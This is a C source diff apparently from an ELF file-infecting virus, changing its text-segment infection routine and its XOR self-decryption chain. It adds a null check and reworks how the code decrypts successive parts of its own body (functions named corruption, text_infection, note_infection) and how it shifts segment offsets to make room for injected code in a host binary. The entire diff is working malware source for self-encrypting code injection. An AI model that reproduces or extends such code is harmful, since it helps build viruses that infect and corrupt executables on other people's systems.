@@ -31,13 +31,16 @@ __attribute__((always_inline)) static inline void update_text_segment(Elf64_Phdr
 
 __attribute__((always_inline)) static inline bool is_enough_space(const Elf64_Phdr *segment1, const Elf64_Phdr *segment2)
 {
+	if (segment2 == NULL)
+		return false;
+
 	return segment2->p_offset - (segment1->p_offset + segment1->p_filesz) > (size_t)((void *)__exit - (void *)L1);
 }
 
-__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
+__attribute__((always_inline)) static inline void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
 {
 	for (register size_t index = 0; index < size; index++)
-		callee[index] ^= keychain->key[RIGHT];
+		callee[index] ^= keychain->key[LEFT];
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -50,7 +53,7 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 	MID_LOGGER("text_infection:\t\t");
 #endif
 
-	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
+	decrypt_left(keychain, (char *)corruption, (void *)text_infection - (void *)corruption);
 
 	if (context == FAILURE)
 		goto label;
@@ -60,10 +63,7 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 	for (register Elf64_Half index = 0; index < host->header->e_phnum; index++)
 	{
 		if ((segment = get_segment(host, index)) == NULL)
-		{
-			context = FAILURE;
-			goto label;
-		}
+			break;
 
 		if (host->segment[TEXT] != NULL)
 			segment->p_offset += PAGE_SIZE;
@@ -87,8 +87,8 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 	update_text_segment(host->segment[TEXT]);
 
 label:
-	update_keychain_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
-	decrypt_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
+	update_keychain_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+	decrypt_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
 
 	note_infection(host, keychain, context);
 }
